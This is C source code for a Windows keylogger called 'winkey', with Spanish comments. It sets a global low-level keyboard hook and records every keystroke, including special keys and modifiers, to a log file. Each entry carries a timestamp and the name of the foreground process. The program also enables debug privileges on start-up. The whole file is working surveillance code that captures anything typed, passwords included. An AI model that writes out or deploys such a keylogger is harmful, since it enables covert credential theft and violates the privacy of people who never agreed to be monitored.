#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0A00  // Define Windows 10 or Windows 11

#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <time.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Psapi.lib")

#define INI_FILE_NAME L"winkey.ini"
#define DEFAULT_LOG_FILE L"winkey.log"
#define ERROR_LOG_FILE L"werror.log"
#define MAX_PATH_LEN 260

wchar_t lastProcessName[MAX_PATH_LEN] = L"";
HWND lastForegroundWindow = NULL;
wchar_t basePath[MAX_PATH_LEN] = L"";  // Ruta base del ejecutable
wchar_t logPath[MAX_PATH_LEN] = L"";  // Ruta del archivo de log, cargada al inicio

// Función para obtener la ruta del ejecutable
void getExecutablePath() {
    DWORD length = GetModuleFileNameW(NULL, basePath, MAX_PATH_LEN);
    if (length == 0 || length == MAX_PATH_LEN) {
        wprintf(L"Error getting executable path. Error: %lu\n", GetLastError());
        wcscpy_s(basePath, MAX_PATH_LEN, L".\\");  // Usar el directorio actual si falla
    } else {
        wchar_t* lastBackslash = wcsrchr(basePath, L'\\');
        if (lastBackslash != NULL) {
            *(lastBackslash + 1) = L'\0';  // Elimina el nombre del ejecutable, dejando solo la ruta
        }
    }
}

// Función para registrar errores
void logError(const wchar_t* format, ...) {
    wchar_t errorLogPath[MAX_PATH_LEN];
    wcscpy_s(errorLogPath, MAX_PATH_LEN, basePath);  // Usa la ruta base
    wcscat_s(errorLogPath, MAX_PATH_LEN, ERROR_LOG_FILE);  // Agrega el nombre del archivo de error

    FILE* file = _wfopen(errorLogPath, L"a+");  // Crea o abre el fichero winkeyerror.log
    if (file == NULL) {
        return;
    }

    time_t now = time(NULL);
    struct tm* localTime = localtime(&now);
    fwprintf(file, L"[%04d-%02d-%02d %02d:%02d:%02d] ",
             localTime->tm_year + 1900,
             localTime->tm_mon + 1,
             localTime->tm_mday,
             localTime->tm_hour,
             localTime->tm_min,
             localTime->tm_sec);

    va_list args;
    va_start(args, format);
    vfwprintf(file, format, args);
    va_end(args);

    fclose(file);
}

// Función para cargar la configuración desde un archivo INI (solo una vez)
void loadConfiguration() {
    wchar_t iniFilePath[MAX_PATH_LEN];
    wcscpy_s(iniFilePath, MAX_PATH_LEN, basePath);  // Usa la ruta base
    wcscat_s(iniFilePath, MAX_PATH_LEN, INI_FILE_NAME);  // Agrega el nombre del archivo INI

    FILE* iniFile = _wfopen(iniFilePath, L"r");
    if (iniFile == NULL) {
        logError(L"INI file does not exist or cannot be opened: %ls\n", iniFilePath);
        wcscpy_s(logPath, MAX_PATH_LEN, basePath);  // Usa la ruta base
        wcscat_s(logPath, MAX_PATH_LEN, DEFAULT_LOG_FILE);  // Agrega el nombre por defecto
        return;
    }
    fclose(iniFile);

    DWORD charsRead = GetPrivateProfileStringW(L"Settings", L"Path", NULL, logPath, MAX_PATH_LEN, iniFilePath);
    if (charsRead == 0) {
        logError(L"Error reading 'Path' from INI. Using default log file.\n");
        wcscpy_s(logPath, MAX_PATH_LEN, basePath);  // Usa la ruta base
        wcscat_s(logPath, MAX_PATH_LEN, DEFAULT_LOG_FILE);  // Agrega el nombre por defecto
    }
}

// Función para elevar privilegios
void elevatePrivileges() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tokenPrivileges;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tokenPrivileges.Privileges[0].Luid);
        tokenPrivileges.PrivilegeCount = 1;
        tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        CloseHandle(hToken);
    } else {
        logError(L"Failed to elevate privileges. Error: %lu\n", GetLastError());
    }
}

// Función para registrar el nombre del proceso activo
void logProcessName(FILE* file) {
    HWND foregroundWindow = GetForegroundWindow();
    if (foregroundWindow == NULL) {
        fwprintf(file, L"[Unknown Process]");
        return;
    }

    if (foregroundWindow != lastForegroundWindow) {
        lastForegroundWindow = foregroundWindow;

        DWORD processId;
        GetWindowThreadProcessId(foregroundWindow, &processId);

        HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
        if (processHandle == NULL) {
            processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
        }
        if (processHandle == NULL) {
            processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        }

        wchar_t processName[MAX_PATH_LEN] = L"Unknown Process";
        if (processHandle != NULL) {
            if (GetModuleBaseNameW(processHandle, NULL, processName, MAX_PATH_LEN) == 0) {
                if (GetProcessImageFileNameW(processHandle, processName, MAX_PATH_LEN) == 0) {
                    wcscpy_s(processName, MAX_PATH_LEN, L"Unknown Process");
                }
            }
            CloseHandle(processHandle);
        }

        if (wcscmp(lastProcessName, processName) != 0) {
            wcscpy_s(lastProcessName, MAX_PATH_LEN, processName);

            time_t now = time(NULL);
            struct tm* localTime = localtime(&now);
            fwprintf(file, L"\n[%04d-%02d-%02d %02d:%02d:%02d] [%ls]\n",
                     localTime->tm_year + 1900,
                     localTime->tm_mon + 1,
                     localTime->tm_mday,
                     localTime->tm_hour,
                     localTime->tm_min,
                     localTime->tm_sec,
                     processName);
        }
    }
}

// Función para registrar teclas especiales
void logSpecialKey(int key, FILE* file) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    WCHAR buffer[16];
    HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));  // NUEVO

    switch (key) {
        case VK_RETURN: fwprintf(file, L"[ENTER]"); break;
        case VK_BACK: fwprintf(file, L"[BACKSPACE]"); break;
        case VK_TAB: fwprintf(file, L"[TAB]"); break;
        case VK_ESCAPE: fwprintf(file, L"[ESC]"); break;
        case VK_SPACE: fwprintf(file, L" "); break;
        case VK_SHIFT: fwprintf(file, L"[SHIFT]"); break;
        case VK_CONTROL: fwprintf(file, L"[CTRL]"); break;
        case VK_MENU: fwprintf(file, L"[ALT]"); break;
        case VK_LWIN: case VK_RWIN: fwprintf(file, L"[WIN]"); break;
        case VK_CAPITAL: fwprintf(file, L"[CAPS LOCK]"); break;
        case VK_DELETE: fwprintf(file, L"[DELETE]"); break;
        case VK_HOME: fwprintf(file, L"[HOME]"); break;
        case VK_END: fwprintf(file, L"[END]"); break;
        case VK_PRIOR: fwprintf(file, L"[PAGE UP]"); break;
        case VK_NEXT: fwprintf(file, L"[PAGE DOWN]"); break;
        default: {
            int result = ToUnicodeEx(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, buffer, 16, 0, keyboardLayout);  // MODIFICADO
            if (result > 0) {
                buffer[result] = L'\0';  // Null-terminate the string
                fwprintf(file, L"%ls", buffer);
            }
            break;
        }
    }
}

// Función para registrar teclas imprimibles
void logPrintableKey(int key, FILE* file) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    WCHAR buffer[16];
    HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));  // NUEVO

    int result = ToUnicodeEx(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, buffer, 16, 0, keyboardLayout);  // MODIFICADO
    if (result > 0) {
        buffer[result] = L'\0';  // Asegura que sea un string null-terminated
        fwprintf(file, L"%ls", buffer);  // Escribir el carácter imprimible
    } else {
        logSpecialKey(key, file);  // Si no es imprimible, registrar como tecla especial
    }
}

// Función para registrar teclas modificadoras
void logModifiers(FILE* file) {
    if (GetKeyState(VK_SHIFT) & 0x8000) {
        fwprintf(file, L"[SHIFT]");
    }
    if (GetKeyState(VK_CONTROL) & 0x8000) {
        fwprintf(file, L"[CTRL]");
    }
    if (GetKeyState(VK_MENU) & 0x8000) {  // Alt key
        fwprintf(file, L"[ALT]");
    }
    if (GetKeyState(VK_LWIN) & 0x8000 || GetKeyState(VK_RWIN) & 0x8000) {
        fwprintf(file, L"[WIN]");
    }
}

// Función para registrar las pulsaciones de teclas
void logKeystroke(int key) {
    FILE* file = _wfopen(logPath, L"a+");
    if (file == NULL) {
        logError(L"Error opening log file: %ls\n", logPath);  // Registrar cualquier error al abrir winkey.log
        return;
    }

    logProcessName(file);  // Registrar el nombre del proceso si cambió
    logModifiers(file);  // Registrar las teclas modificadoras presionadas

    if ((key >= 0x30 && key <= 0x5A) || (key >= 0x60 && key <= 0x7A)) {
        logPrintableKey(key, file);  // Registrar teclas imprimibles
    } else {
        logSpecialKey(key, file);  // Registrar teclas especiales o no imprimibles
    }

    fclose(file);
}

// Función de hook de teclado
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        int key = kbdStruct->vkCode;
        logKeystroke(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Función para registrar el proceso activo al cambiar de ventana
void logActiveProcessOnWindowChange() {
    FILE* file = _wfopen(logPath, L"a+");
    if (file != NULL) {
        logProcessName(file);  // Registrar el proceso activo en el archivo de log
        fclose(file);
    }
}

// Función principal para la ejecución como consola
int wmain(void) {
    getExecutablePath();  // Obtener la ruta del ejecutable
    loadConfiguration();  // Cargar la configuración del archivo INI una sola vez

    elevatePrivileges();  // Elevar privilegios si es posible

    logError(L"Log file: %ls\n", logPath);  // Registrar la ruta del archivo de log

    HHOOK hook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
    if (hook == NULL) {
        logError(L"Error setting up keyboard hook. Error: %lu\n", GetLastError());
        return 1;
    }

    logActiveProcessOnWindowChange();  // Registrar el proceso activo cuando el programa inicie

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        if (msg.message == WM_ACTIVATEAPP || msg.message == WM_SETFOCUS) {
            logActiveProcessOnWindowChange();  // Registrar cuando cambie el foco
        }
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}

// Función principal para la ejecución como aplicación de Windows
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);
    return wmain();  // Reutiliza la lógica de wmain para mantener el mismo flujo
}
